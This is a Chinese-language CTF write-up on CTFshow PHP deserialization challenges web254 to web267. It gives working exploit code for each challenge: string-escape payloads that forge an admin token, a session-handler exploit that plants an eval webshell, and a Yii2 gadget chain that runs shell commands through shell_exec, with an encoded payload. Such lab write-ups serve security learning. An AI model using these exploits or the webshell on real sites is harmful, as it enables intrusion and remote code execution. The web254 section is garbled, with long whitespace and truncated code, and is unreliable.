+++
date = '2024-12-22T00:27:55+08:00'
title = 'CTFSHOW-反序列化-Writeup'
categories = ["Writeup"]
tags = ["writeup", "ctf", "Web"]

+++



#### PHP的魔法方法

PHP 将所有以 __（两个下划线）开头的类方法保留为魔术方法。所以在定义类方法时，除了上述魔术方法，建议不要以 __ 为前缀。 常见的魔法方法如下：

```scss
__construct()，类的构造函数

__destruct()，类的析构函数

__call()，在对象中调用一个不可访问方法时调用

__callStatic()，用静态方式中调用一个不可访问方法时调用

__get()，获得一个类的成员变量时调用

__set()，设置一个类的成员变量时调用

__isset()，当对不可访问属性调用isset()或empty()时调用

__unset()，当对不可访问属性调用unset()时被调用。

__sleep()，执行serialize()时，先会调用这个函数

__wakeup()，执行unserialize()时，先会调用这个函数

__toString()，类被当成字符串时的回应方法

__invoke()，调用函数的方式调用一个对象时的回应方法

__set_state()，调用var_export()导出类时，此静态方法会被调用。

__clone()，当对象复制完成时调用

__autoload()，尝试加载未定义的类

__debugInfo()，打印所需调试信息
```

#### web254

```php
<?php

                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                ?>';
    public $code='xrntkk';
}

$poc = new ctfshowvip();
echo urlencode(serialize($poc));
```



#### web262

字符串逃逸

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-12-03 02:37:19
# @Last Modified by:   h1xa
# @Last Modified time: 2020-12-03 16:05:38
# @message.php
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/


error_reporting(0);
class message{
    public $from;
    public $msg;
    public $to;
    public $token='user';
    public function __construct($f,$m,$t){
        $this->from = $f;
        $this->msg = $m;
        $this->to = $t;
    }
}

$f = $_GET['f'];
$m = $_GET['m'];
$t = $_GET['t'];

if(isset($f) && isset($m) && isset($t)){
    $msg = new message($f,$m,$t);
    $umsg = str_replace('fuck', 'loveU', serialize($msg));
    setcookie('msg',base64_encode($umsg));
    echo 'Your message has been sent';
}

highlight_file(__FILE__);
```

message.php

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-12-03 15:13:03
# @Last Modified by:   h1xa
# @Last Modified time: 2020-12-03 15:17:17
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/
highlight_file(__FILE__);
include('flag.php');

class message{
    public $from;
    public $msg;
    public $to;
    public $token='user';
    public function __construct($f,$m,$t){
        $this->from = $f;
        $this->msg = $m;
        $this->to = $t;
    }
}

if(isset($_COOKIE['msg'])){
    $msg = unserialize(base64_decode($_COOKIE['msg']));
    if($msg->token=='admin'){
        echo $flag;
    }
}
```

我们的目的就是想办法让token等于admin

信息传输的过程中使用的序列化和反序列化，存在字符串逃逸，通过逃逸我们可以使token=admin

之前写过我就懒得重新写了

https://ctf.show/writeups/706838

![image-20250228003417179](../assets/image-20250228003417179.png)

首先先生成一段序列

```php
<?php
class message{
    public $from;
    public $msg;
    public $to = '123';
    public $token='admin';

}
$payload = new message();
echo serialize($payload);

O:7:"message":4:{s:4:"from";N;s:3:"msg";N;s:2:"to";s:3:"123";s:5:"token";s:5:"admin";}
```

截取后面一部分作为to的值传入

payload:

```
?f=&m=&t=fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck";s:5:"token";s:5:"admin";}
```



#### web263

![image-20250228004020214](../assets/image-20250228004020214.png)

访问/www.zip拿到源码

审计代码我们可以在/inc/inc.php中找到这样一个危险方法

![image-20250228005856300](../assets/image-20250228005856300.png)

假如username和password可控，我们就可以写入木马

但是这是一个__destruct方法，想要触发必须要经过反序列化，那这道题哪里有进行反序列的地方呢

[文章 - 带你走进PHP session反序列化漏洞 - 先知社区](https://xz.aliyun.com/news/6244?time__1311=YqIxBDgDnD07qGNKeeqBIK0KdAKe%2B70%2BfbD&u_atoken=d15fdd66ae728e3bfa83f1dbe7fa90e3&u_asig=1a0c399817406759936298578e00ef)

这篇文章讲得很详细

归根结底这个漏洞之所以存在是由于序列化和反序列化时使用的处理器不同造成的

`session.serialize_handler`定义的引擎有三种，如下表所示：

| 处理器名称    | 存储格式                                                     |
| ------------- | ------------------------------------------------------------ |
| php           | 键名 + 竖线 + 经过`serialize()`函数序列化处理的值            |
| php_binary    | 键名的长度对应的 ASCII 字符 + 键名 + 经过`serialize()`函数序列化处理的值 |
| php_serialize | 经过serialize()函数序列化处理的**数组**                      |

**注：自 PHP 5.5.4 起可以使用 php_serialize**

这道题的php版本为7.3.11，默认使用的处理器为php_serialize

而在/inc/inc.php中却设置处理器为php

也就是说序列化和反序列化所使用的处理器不同

所以我们可以根据php处理器的格式构造出payload

exp：

```php
<?php

class User{
    public $username;
    public $password;
    function __construct(){
        $this->username = '1.php';
        $this->password = '<?php eval($_POST[1]);?>';
    }
}

echo urlencode(base64_encode('|'.serialize(new User())));

?>
```

我们将cookie中的limit修改为我们序列化后的结果

/index.php

```php
	if(isset($_SESSION['limit'])){
		$_SESSION['limti']>5?die("登陆失败次数超过限制"):$_SESSION['limit']=base64_decode($_COOKIE['limit']);
		$_COOKIE['limit'] = base64_encode(base64_decode($_COOKIE['limit']) +1);
	}else{
		 setcookie("limit",base64_encode('1'));
		 $_SESSION['limit']= 1;
	}
```

![image-20250228012705035](../assets/image-20250228012705035.png)

修改后访问/check.php进行反序列化

最后访问/log-1.php

![image-20250228122708718](../assets/image-20250228122708718.png)

成功写入





#### web264

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-12-03 02:37:19
# @Last Modified by:   h1xa
# @Last Modified time: 2020-12-03 16:05:38
# @message.php
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/


error_reporting(0);
session_start();

class message{
    public $from;
    public $msg;
    public $to;1
    public function __construct($f,$m,$t){
        $this->from = $f;
        $this->msg = $m;
        $this->to = $t;
    }
}

$f = $_GET['f'];
$m = $_GET['m'];
$t = $_GET['t'];

if(isset($f) && isset($m) && isset($t)){
    $msg = new message($f,$m,$t);
    $umsg = str_replace('fuck', 'loveU', serialize($msg));
    $_SESSION['msg']=base64_encode($umsg);
    echo 'Your message has been sent';
}

highlight_file(__FILE__);

```

message.php

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-12-03 15:13:03
# @Last Modified by:   h1xa
# @Last Modified time: 2020-12-03 15:17:17
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/
session_start();
highlight_file(__FILE__);
include('flag.php');

class message{
    public $from;
    public $msg;
    public $to;
    public $token='user';
    public function __construct($f,$m,$t){
        $this->from = $f;
        $this->msg = $m;
        $this->to = $t;
    }
}

if(isset($_COOKIE['msg'])){
    $msg = unserialize(base64_decode($_SESSION['msg']));
    if($msg->token=='admin'){
        echo $flag;
    }
}
```

这题是修复了web262的非预期解，也就是可以直接在message.php修改cookie进行反序列化

所以解法同web262

payload:

```
?f=1&m=1&t=fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck";s:5:"token";s:5:"admin";}
```

注意要在message.php的cookie中加上msg=1

![image-20250301152439388](../assets/image-20250301152439388.png)



#### web265

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-12-04 23:52:24
# @Last Modified by:   h1xa
# @Last Modified time: 2020-12-05 00:17:08
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/

error_reporting(0);
include('flag.php');
highlight_file(__FILE__);
class ctfshowAdmin{
    public $token;
    public $password;

    public function __construct($t,$p){
        $this->token=$t;
        $this->password = $p;
    }
    public function login(){
        return $this->token===$this->password;
    }
}

$ctfshow = unserialize($_GET['ctfshow']);
$ctfshow->token=md5(mt_rand());

if($ctfshow->login()){
    echo $flag;
}

```

这题指针引用使password恒等于token即可

exp

```php
<?php
  class ctfshowAdmin{
      public $token;
      public $password;

      public function __construct($t,$p){
          $this->token=$t;
          $this->password = $p;
      }
  }
  $a = new ctfshowAdmin("我能打上海major","全场欢呼！DANKING！DANKING！");
  $a->password = &$a->token;
  echo urlencode(serialize($a));
```



#### web266

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-12-04 23:52:24
# @Last Modified by:   h1xa
# @Last Modified time: 2020-12-05 00:17:08
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/

highlight_file(__FILE__);

include('flag.php');
$cs = file_get_contents('php://input');


class ctfshow{
    public $username='xxxxxx';
    public $password='xxxxxx';
    public function __construct($u,$p){
        $this->username=$u;
        $this->password=$p;
    }
    public function login(){
        return $this->username===$this->password;
    }
    public function __toString(){
        return $this->username;
    }
    public function __destruct(){
        global $flag;
        echo $flag;
    }
}
$ctfshowo=@unserialize($cs);
if(preg_match('/ctfshow/', $cs)){
    throw new Exception("Error $ctfshowo",1);
}
```

php大小写不敏感，大小写绕过

exp

```php
<?php
class Ctfshow{

}
echo serialize(new Ctfshow());
```

```
O:7:"Ctfshow":0:{}
```





#### web267

考点：Yii2 反序列化漏洞

![image-20250301204824118](../assets/image-20250301204824118.png)

有一个登录入口

弱口令成功登入admin/admin

![image-20250301204939802](../assets/image-20250301204939802.png)

在/index.php?r=site%2Fabout处查看源代码看到hint

![image-20250301205004026](../assets/image-20250301205004026.png)

访问/index.php?r=site%2Fabout&view-source

![image-20250301205133641](../assets/image-20250301205133641.png)

题目给出了入口点

从源码中我们可以知道这道题用的是yii框架，而且为2.0版本

![image-20250301212728743](../assets/image-20250301212728743.png)

[yii反序列化漏洞复现及利用_yii框架漏洞-CSDN博客](https://blog.csdn.net/cosmoslin/article/details/120612714)

直接用poc总感觉缺了点什么，那自己搓一搓吧，但是过程就不放在这里了

```
<?php

namespace yii\rest{
    class IndexAction{
        public $checkAccess;
        public $id;
        public function __construct(){
            $this->checkAccess = 'shell_exec';
            $this->id = 'cat /flag | tee 1';//命令执行
        }
    }
}
namespace Faker {

    use yii\rest\IndexAction;

    class Generator
    {
        protected $formatters;

        public function __construct()
        {
            $this->formatters['close'] = [new IndexAction(), 'run'];
        }
    }
}
namespace yii\db{

    use Faker\Generator;

    class BatchQueryResult{
        private $_dataReader;
        public function __construct()
        {
            $this->_dataReader=new Generator();
        }
    }
}
namespace{

    use yii\db\BatchQueryResult;

    echo base64_encode(serialize(new BatchQueryResult()));
}
```

没回显，用tee将输出复制到1文件中

payload

```
?r=backdoor/shell&code=TzoyMzoieWlpXGRiXEJhdGNoUXVlcnlSZXN1bHQiOjE6e3M6MzY6IgB5aWlcZGJcQmF0Y2hRdWVyeVJlc3VsdABfZGF0YV
JlYWRlciI7TzoxNToiRmFrZXJcR2VuZXJhdG9yIjoxOntzOjEzOiIAKgBmb3JtYXR0ZXJzIjthOjE6e3M6NToiY2xvc2UiO2E6Mjp7aTowO086MjA6InlpaV
xyZXN0XEluZGV4QWN0aW9uIjoyOntzOjExOiJjaGVja0FjY2VzcyI7czoxMDoic2hlbGxfZXhlYyI7czoyOiJpZCI7czoxNzoiY2F0IC9mbGFnIHwgdGVlID
EiO31pOjE7czozOiJydW4iO319fX0=
```

